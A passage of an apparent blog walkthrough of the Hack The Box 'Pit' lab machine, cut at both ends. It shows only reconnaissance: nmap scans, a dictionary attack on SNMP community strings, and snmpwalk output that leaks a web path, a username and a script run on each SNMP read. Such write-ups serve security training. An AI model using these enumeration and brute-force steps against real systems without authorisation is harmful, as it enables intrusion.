root">Shell as root</a></li></ul></li></ul></div></aside><div class=post-content><figure class=entry-cover><img srcset="https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486_hu5e935cccec61f31e3a120487c0a2dfa1_145540_360x0_resize_box_3.png 360w ,https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486_hu5e935cccec61f31e3a120487c0a2dfa1_145540_480x0_resize_box_3.png 480w ,https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486_hu5e935cccec61f31e3a120487c0a2dfa1_145540_720x0_resize_box_3.png 720w ,https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486.png 736w" sizes="(min-width: 768px) 720px, 100vw" src=https://fahmifj.github.io/hackthebox/pit/imgs/image-20211013111002486.png alt width=736 height=464></figure><p>As a medium difficulty box, Pit from Hack The Box has a well-designed enumeration flow. It starts by enumerating SNMP to reveal a username and a hidden web path to a CMS called SeedDMS, where I can login with that username. The CMS is vulnerable to a remote code execution, allowing me to obtain a database password that I can then use on a <a href=https://cockpit-project.org/>Cockpit</a> instance. Enumerating the system from Cockpit&rsquo;s terminal reveals that each time a &ldquo;walk&rdquo; is performed, SNMP will execute a script. This script basically searches for and executes other scripts in a specific directory to which I have write access, allowing me to create a malicious script in there to gain root access.</p><h4 id=skills-learned>Skills Learned<a class=anchor aria-hidden=true href=#skills-learned>#</a></h4><ul><li>SNMP enumeration and exploitation</li><li>SeedDMS exploitation</li><li>Cockpit exploitation</li></ul><h4 id=tools>Tools<a class=anchor aria-hidden=true href=#tools>#</a></h4><ul><li>Nmap</li><li>snmpwalk</li><li>gobuster</li></ul><h2 id=reconnaissance>Reconnaissance<a class=anchor aria-hidden=true href=#reconnaissance>#</a></h2><h3 id=nmap>Nmap<a class=anchor aria-hidden=true href=#nmap>#</a></h3><h4 id=tcp>TCP<a class=anchor aria-hidden=true href=#tcp>#</a></h4><p>For TCP ports, <code>nmap</code> discovers 3 open ports: SSH on port 22, an NGINX web server on port 80, and a service that <code>nmap</code> identifies it as zeus-admin.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ nmap -p- --max-rate <span class=m>1000</span> -sV --reason -oA nmap/10-tcp-allport-pit 10.10.10.241
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-20 11:03 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.241
</span></span><span class=line><span class=cl>Host is up, received echo-reply ttl <span class=m>63</span> <span class=o>(</span>0.079s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>65532</span> filtered ports
</span></span><span class=line><span class=cl>Reason: <span class=m>65332</span> no-responses and <span class=m>200</span> admin-prohibiteds
</span></span><span class=line><span class=cl>PORT     STATE SERVICE         REASON         VERSION
</span></span><span class=line><span class=cl>22/tcp   open  ssh             syn-ack ttl <span class=m>63</span> OpenSSH 8.0 <span class=o>(</span>protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http            syn-ack ttl <span class=m>63</span> nginx 1.14.1
</span></span><span class=line><span class=cl>9090/tcp open  ssl/zeus-admin? syn-ack ttl <span class=m>63</span>
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 401.69 seconds
</span></span><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ nmap -p22,80,9090 --max-rate <span class=m>1000</span> -sC -oA nmap/10-tcp-defaultsc-pit 10.10.10.241
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-20 11:12 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.241
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.16s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>3072</span> 6f:c3:40:8f:69:50:69:5a:57:d7:9c:4e:7b:1b:94:96 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> c2:6f:f8:ab:a1:20:83:d1:60:ab:cf:63:2d:c8:65:b7 <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 6b:65:6c:a6:92:e5:cc:76:17:5a:2f:9a:e7:50:c3:50 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Test Page <span class=k>for</span> the Nginx HTTP Server on Red Hat Enterprise Linux
</span></span><span class=line><span class=cl>9090/tcp open  zeus-admin
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>dms-pit.htb/organizationName<span class=o>=</span>4cd9329523184b0ea52ba0d20a1a6f92/countryName<span class=o>=</span>US
</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: DNS:dms-pit.htb, DNS:localhost, IP Address:127.0.0.1
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2020-04-16T23:29:12
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2030-06-04T16:09:12
</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: TLS randomness does not represent <span class=nb>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 4.39 seconds
</span></span></code></pre></div><p>Also, <code>nmap</code> revealed a domain name <code>dms-pit.htb</code> from the SSL certificate on port 9090. I will add it to my <code>/etc/hosts</code> file</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ <span class=nb>echo</span> <span class=s1>&#39;10.10.10.241 dms-pit.htb pit.htb&#39;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></div><h4 id=udp>UDP<a class=anchor aria-hidden=true href=#udp>#</a></h4><p>For UDP ports, <code>nmap</code> discovers an SNMP server on port 161 and reveals a domain name <code>pit.htb</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ nmap -sU -sV -n --top-ports <span class=m>20</span> -oA nmap/10-udp-top20-pit 10.10.10.241
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2021-05-20 11:18 EDT
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.241
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.074s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT      STATE         SERVICE      VERSION
</span></span><span class=line><span class=cl>53/udp    open<span class=p>|</span>filtered domain
</span></span><span class=line><span class=cl>67/udp    open<span class=p>|</span>filtered dhcps
</span></span><span class=line><span class=cl>68/udp    filtered      dhcpc
</span></span><span class=line><span class=cl>69/udp    open<span class=p>|</span>filtered tftp
</span></span><span class=line><span class=cl>123/udp   open<span class=p>|</span>filtered ntp
</span></span><span class=line><span class=cl>135/udp   open<span class=p>|</span>filtered msrpc
</span></span><span class=line><span class=cl>137/udp   open<span class=p>|</span>filtered netbios-ns
</span></span><span class=line><span class=cl>138/udp   filtered      netbios-dgm
</span></span><span class=line><span class=cl>139/udp   open<span class=p>|</span>filtered netbios-ssn
</span></span><span class=line><span class=cl>161/udp   open          snmp         SNMPv1 server<span class=p>;</span> net-snmp SNMPv3 server <span class=o>(</span>public<span class=o>)</span>
</span></span><span class=line><span class=cl>162/udp   open<span class=p>|</span>filtered snmptrap
</span></span><span class=line><span class=cl>445/udp   filtered      microsoft-ds
</span></span><span class=line><span class=cl>500/udp   open<span class=p>|</span>filtered isakmp
</span></span><span class=line><span class=cl>514/udp   filtered      syslog
</span></span><span class=line><span class=cl>520/udp   open<span class=p>|</span>filtered route
</span></span><span class=line><span class=cl>631/udp   open<span class=p>|</span>filtered ipp
</span></span><span class=line><span class=cl>1434/udp  open<span class=p>|</span>filtered ms-sql-m
</span></span><span class=line><span class=cl>1900/udp  filtered      upnp
</span></span><span class=line><span class=cl>4500/udp  open<span class=p>|</span>filtered nat-t-ike
</span></span><span class=line><span class=cl>49152/udp open<span class=p>|</span>filtered unknown
</span></span><span class=line><span class=cl>Service Info: Host: pit.htb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 18.21 seconds
</span></span></code></pre></div><h3 id=poking-the-websites>Poking the websites<a class=anchor aria-hidden=true href=#poking-the-websites>#</a></h3><p>For HTTP, it seems only <code>dms-pit.htb</code> that serves different content.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ curl -s http://10.10.10.241/ <span class=p>|</span> wc -c                                 
</span></span><span class=line><span class=cl><span class=m>4057</span>
</span></span><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ curl -s http://pit.htb/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>4057</span>
</span></span><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ curl -s http://dms-pit.htb/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>169</span>
</span></span></code></pre></div><p>For HTTPS on port 9090, it&rsquo;s all the same site.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ curl -s -k https://10.10.10.241:9090/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>43548</span>
</span></span><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ curl -s -k https://pit.htb:9090/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>43548</span>
</span></span><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49» 
</span></span><span class=line><span class=cl>$ curl -s -k https://dms-pit.htb:9090/ <span class=p>|</span> wc -c
</span></span><span class=line><span class=cl><span class=m>43548</span>
</span></span></code></pre></div><h2 id=enumeration>Enumeration<a class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=tcp-80---website>TCP 80 - Website<a class=anchor aria-hidden=true href=#tcp-80---website>#</a></h3><p>On port 80, a NGINX default web page for REHL is shown here.</p><p><div class=img-container><img src=imgs/image-20210520224354684.png alt=image-20210520224354684></div></p><p>Running <code>gobuster</code> against this site doesn&rsquo;t really find something useful, and I couldn&rsquo;t find a critical vulnerability on <code>nginx 1.14.1</code>.</p><h3 id=tcp-80---dms-pithtb>TCP 80 - dms-pit.htb<a class=anchor aria-hidden=true href=#tcp-80---dms-pithtb>#</a></h3><p>Heading to <code>dms-pit.htb</code> on port 80 shows a 403 forbidden error message.</p><p><div class=img-container><img src=imgs/image-20210520224457026.png alt=image-20210520224457026></div></p><p>For this site, <code>gobuster</code> actually found some files, but all of them returned with 403 status.</p><h3 id=tcp-9090---website-https>TCP 9090 - Website (HTTPS)<a class=anchor aria-hidden=true href=#tcp-9090---website-https>#</a></h3><p>On port 9090, there is a login page.</p><p><div class=img-container><img src=imgs/image-20210520225003343.png alt=image-20210520225003343></div></p><p>This page was identified as an instance of <a href=https://cockpit-project.org/.>Cockpit</a>, a web-based interface for system administration.</p><h4 id=searchsploit>Searchsploit<a class=anchor aria-hidden=true href=#searchsploit>#</a></h4><p>There is a security issue on GitHub which talks about SSRF:</p><ul><li><a href=https://github.com/cockpit-project/cockpit/issues/15077>https://github.com/cockpit-project/cockpit/issues/15077</a></li></ul><p>The researcher disclosed the issue in his blog.</p><ul><li><a href=https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850>https://docs.unsafe-inline.com/0day/cokpit-version-234-server-side-request-forgery-cve-2020-35850</a></li></ul><p>The researcher also provides a PoC, but it requires an account, so I will move on to the next service.</p><h3 id=udp-161---snmp>UDP 161 - SNMP<a class=anchor aria-hidden=true href=#udp-161---snmp>#</a></h3><p>From what <code>nmap</code> gave, I assume that this machine supports SNMPv1-SNMPv3. Based on what I read on <a href=https://book.hacktricks.xyz/pentesting/pentesting-snmp>HackTricks</a>, to enumerate SNMP version 1/2c, I need to know the community string name, and there are two types of it: <code>public</code> and <code>private</code>.</p><p>The <code>public</code> community string normally grants read access, however <code>private</code> may grant you read/write access, even leading to <a href=https://book.hacktricks.xyz/pentesting/pentesting-snmp/snmp-rce>remote code execution</a>.</p><p>For SNMP version 1 and 2c, it is possible to identify a valid community string based on the server&rsquo;s response with a dictionary attack (brute) . In Kali, there is a preinstalled tool for this, which I will use called <code>onesixtyone</code>. I will run it and save the output to a file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ onesixtyone -c /opt/SecLists/Discovery/SNMP/snmp.txt 10.10.10.241 &gt; snmp-enum/brute-community-strings
</span></span></code></pre></div><p>The attack reveals that <strong>public</strong> is a valid community string.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ cat snmp-enum/brute-community-strings
</span></span><span class=line><span class=cl>Scanning <span class=m>1</span> hosts, <span class=m>3220</span> communities
</span></span><span class=line><span class=cl>10.10.10.241 <span class=o>[</span>public<span class=o>]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class=c1>#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
</span></span><span class=line><span class=cl>10.10.10.241 <span class=o>[</span>public<span class=o>]</span> Linux pit.htb 4.18.0-240.22.1.el8_3.x86_64 <span class=c1>#1 SMP Thu Apr 8 19:01:30 UTC 2021 x86_64</span>
</span></span></code></pre></div><p>Now to enumerate SNMP, I will use another preinstalled tool called <code>snmpwalk</code>. Using this tool will return a list of <a href=https://book.hacktricks.xyz/pentesting/pentesting-snmp#oids>OID (Objects Identifiers)</a> which consists a set of numbers separated by dot, so to translate these numbers into a bit meaningful, I will need <code>snmp-mibs-downloader</code>. I will install that with:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ apt-get install snmp-mibs-downloader
</span></span></code></pre></div><p>The general usage for <code>snmpwalk</code> is:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ snmpwalk <span class=o>[</span>OPTIONS<span class=o>]</span> AGENT <span class=o>[</span>OID<span class=o>]</span>
</span></span></code></pre></div><p>Actually, I did a lot of enumeration with SNMP, but because OID is a hierarchical structure, I found that it was easier to start from the Internet OID, which is <code>1.3.6.1</code>, so that it would &ldquo;walk&rdquo; down to any readable OID branch, it is something like <code>1.3.6.1</code> -> <code>1.3.6.1.1</code> (directory OID) -> &mldr; -> <code>1.3.6.1.4</code> (private OID) -> &mldr; -> <code>1.3.6.1.X.X</code>.</p><p>I will run <code>snmpwalk</code> on that and save the output to <code>snmp-internet-1.3.6.1.out</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ snmpwalk -v 2c -c public 10.10.10.241 internet &gt; snmp-internet-1.3.6.1.out
</span></span></code></pre></div><ul><li><code>-v</code> 2c: SNMP version 2c. SNMP version 1 and 2c sends data in clear-text while version 3 uses auth.</li><li><code>-c</code> public: community string</li><li><code>internet</code>: auto translated to 1.3.6.1 by <code>snmp-mibs-downloader</code></li></ul><p>I will filter the output with <code>hrSWRunParameters</code> (Host Resources Software Run Parameters), which might leak some sensitive information from the command line arguments of the current running processes, but it doesn&rsquo;t have any.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>→ root@kali «pit» «10.10.14.49»
</span></span><span class=line><span class=cl>$ cat snmp-enum/snmp-internet-1.3.6.1.out <span class=p>|</span> grep <span class=s2>&#34;hrSWRunParameters&#34;</span> <span class=p>|</span> grep STRING
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1 <span class=o>=</span> STRING: <span class=s2>&#34;--switched-root --system --deserialize 17&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1000 <span class=o>=</span> STRING: <span class=s2>&#34;--system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1001 <span class=o>=</span> STRING: <span class=s2>&#34;--foreground&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1002 <span class=o>=</span> STRING: <span class=s2>&#34;--no-debug&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1004 <span class=o>=</span> STRING: <span class=s2>&#34;-s&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1009 <span class=o>=</span> STRING: <span class=s2>&#34;-i --logger=files&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1011 <span class=o>=</span> STRING: <span class=s2>&#34;-f --fill-watermark=0&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1041 <span class=o>=</span> STRING: <span class=s2>&#34;--domain implicit_files --uid 0 --gid 0 --logger=files&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1051 <span class=o>=</span> STRING: <span class=s2>&#34;--uid 0 --gid 0 --logger=files&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1056 <span class=o>=</span> STRING: <span class=s2>&#34;-s /usr/sbin/firewalld --nofork --nopid&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1090 <span class=o>=</span> STRING: <span class=s2>&#34;--no-daemon&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1101 <span class=o>=</span> STRING: <span class=s2>&#34;-D -oCiphers=aes256-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes256-cbc,aes128-gcm@openssh.com,aes128-ctr,aes128&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1105 <span class=o>=</span> STRING: <span class=s2>&#34;-Es /usr/sbin/tuned -l -P&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1116 <span class=o>=</span> STRING: <span class=s2>&#34;-n&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1193 <span class=o>=</span> STRING: <span class=s2>&#34;-o -p -- \\u --noclear tty1 linux&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1208 <span class=o>=</span> STRING: <span class=s2>&#34;--basedir=/usr&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1479 <span class=o>=</span> STRING: <span class=s2>&#34;-n&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.1481 <span class=o>=</span> STRING: <span class=s2>&#34;-LS0-6d -f&#34;</span>
</span></span><span class=line><span class=cl>HOST-RESOURCES-MIB::hrSWRunParameters.10212 <span class=o>=</span> STRING: <span class=s2>&#34;-Es /usr/share/setroubleshoot/SetroubleshootFixit.py&#34;</span>
</span></span></code></pre></div><p>If I examine the entire output carefully, the two most interesting information are:</p><ul><li>A web path <code>/var/www/html/seeddms51x/seeddms</code>, and</li><li>A potential username: <code>michelle</code></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>UCD-SNMP-MIB::dskPath.2 <span class=o>=</span> STRING: /var/www/html/seeddms51x/seeddms
</span></span><span class=line><span class=cl>UCD-SNMP-MIB::dskDevice.1 <span class=o>=</span> STRING: /dev/mapper/cl-root
</span></span><span class=line><span class=cl>UCD-SNMP-MIB::dskDevice.2 <span class=o>=</span> STRING: /dev/mapper/cl-seeddms
</span></span><span class=line><span class=cl>...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 <span class=o>=</span> INTEGER: <span class=m>1</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendCommand.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> STRING: /usr/bin/monitor
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendArgs.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> STRING: 
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendInput.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> STRING: 
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendCacheTime.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> INTEGER: <span class=m>5</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendExecType.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> INTEGER: exec<span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendRunType.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> INTEGER: run-on-read<span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendStorage.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> INTEGER: permanent<span class=o>(</span>4<span class=o>)</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendStatus.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> INTEGER: active<span class=o>(</span>1<span class=o>)</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> STRING: Memory usage
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutputFull.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> STRING: Memory usage
</span></span><span class=line><span class=cl>              total        used        free      shared  buff/cache   available
</span></span><span class=line><span class=cl>Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
</span></span><span class=line><span class=cl>Swap:         1.9Gi          0B       1.9Gi
</span></span><span class=line><span class=cl>Database status
</span></span><span class=line><span class=cl>OK - Connection to database successful.
</span></span><span class=line><span class=cl>System release info
</span></span><span class=line><span class=cl>CentOS Linux release 8.3.2011
</span></span><span class=line><span class=cl>SELinux Settings
</span></span><span class=line><span class=cl>user
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                Labeling   MLS/       MLS/                          
</span></span><span class=line><span class=cl>SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>guest_u         user       s0         s0                             guest_r
</span></span><span class=line><span class=cl>root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
</span></span><span class=line><span class=cl>staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
</span></span><span class=line><span class=cl>sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
</span></span><span class=line><span class=cl>system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class=line><span class=cl>unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
</span></span><span class=line><span class=cl>user_u          user       s0         s0                             user_r
</span></span><span class=line><span class=cl>xguest_u        user       s0         s0                             xguest_r
</span></span><span class=line><span class=cl>login
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Login Name           SELinux User         MLS/MCS Range        Service
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>__default__          unconfined_u         s0-s0:c0.c1023       *
</span></span><span class=line><span class=cl>michelle             user_u               s0                   *
</span></span><span class=line><span class=cl>root                 unconfined_u         s0-s0:c0.c1023       *
</span></span><span class=line><span class=cl>System uptime
</span></span><span class=line><span class=cl> 14:03:52 up 12:03,  <span class=m>0</span> users,  load average: 0.04, 0.01, 0.00
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> INTEGER: <span class=m>31</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendResult.<span class=s2>&#34;monitoring&#34;</span> <span class=o>=</span> INTEGER: <span class=m>0</span>
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.1 <span class=o>=</span> STRING: Memory usage
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.2 <span class=o>=</span> STRING:               total        used        free      shared  buff/cache   available
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.3 <span class=o>=</span> STRING: Mem:          3.8Gi       415Mi       3.0Gi        16Mi       452Mi       3.2Gi
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.4 <span class=o>=</span> STRING: Swap:         1.9Gi          0B       1.9Gi
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.5 <span class=o>=</span> STRING: Database status
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.6 <span class=o>=</span> STRING: OK - Connection to database successful.
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.7 <span class=o>=</span> STRING: System release info
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.8 <span class=o>=</span> STRING: CentOS Linux release 8.3.2011
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.9 <span class=o>=</span> STRING: SELinux Settings
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.10 <span class=o>=</span> STRING: user
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.11 <span class=o>=</span> STRING: 
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.12 <span class=o>=</span> STRING:                 Labeling   MLS/       MLS/                          
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.13 <span class=o>=</span> STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.14 <span class=o>=</span> STRING: 
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.15 <span class=o>=</span> STRING: guest_u         user       s0         s0                             guest_r
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.16 <span class=o>=</span> STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
</span></span><span class=line><span class=cl>NET-SNMP-EXTEND-MIB::nsExtendOutLine.<span class=s2>&#34;monitoring&#34;</span>.17 <span class=o>=</span> STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
